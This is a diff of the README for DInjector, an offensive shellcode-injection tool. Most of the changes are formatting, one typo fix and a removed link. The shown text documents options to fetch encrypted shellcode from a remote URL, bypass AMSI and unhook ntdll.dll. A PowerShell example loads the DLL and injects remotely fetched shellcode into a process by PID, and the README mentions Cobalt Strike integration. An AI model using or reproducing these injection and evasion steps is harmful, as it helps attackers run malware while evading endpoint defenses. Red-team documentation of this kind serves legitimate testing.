@@ -69,15 +69,15 @@ Global arguments:
 | `/sc`       | ✔️        | `http://10.10.13.37/enc` | Sets shellcode path (can be loaded from URL or as a base64 string) |
 | `/password` | ✔️        | `Passw0rd!`              | Sets password to decrypt the shellcode                             |
 | `/sleep`    | ❌        | `10`, `25`               | Sets number of seconds (approx.) to sleep before execution         |
-| `/am51`     | ❌        | `True`, `False`          | Applies AMSI bypass                                                |
-| `/unhook`   | ❌        | `True`, `False`          | Unhooks ntdll.dll                                                  |
+| `/am51`     | ❌        | `True` / `False`          | Applies AMSI bypass                                                |
+| `/unhook`   | ❌        | `True` / `False`          | Unhooks ntdll.dll                                                  |
 
 Test it locally:
 
 ```powershell
 PS > $bytes = [System.IO.File]::ReadAllBytes("C:\DInjector.dll")
 PS > $assem = [System.Reflection.Assembly]::Load($bytes)
-PS > [DInjector.Detonator]::Boom("remothread /sc:http://10.10.13.37/enc /password:Passw0rd! /pid:1337 /am51:True")
+PS > [DInjector.Detonator]::Boom("remotethread /sc:http://10.10.13.37/enc /password:Passw0rd! /pid:1337 /am51:True")
 ```
 
 ## Cobalt Strike Integration
@@ -126,7 +126,6 @@ api:
     1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
 opsec_safe: false
 references:
-  - 'https://jhalon.github.io/utilizing-syscalls-in-csharp-1/'
   - 'https://jhalon.github.io/utilizing-syscalls-in-csharp-2/'
   - 'https://github.com/jhalon/SharpCall/blob/master/Syscalls.cs'
 ```
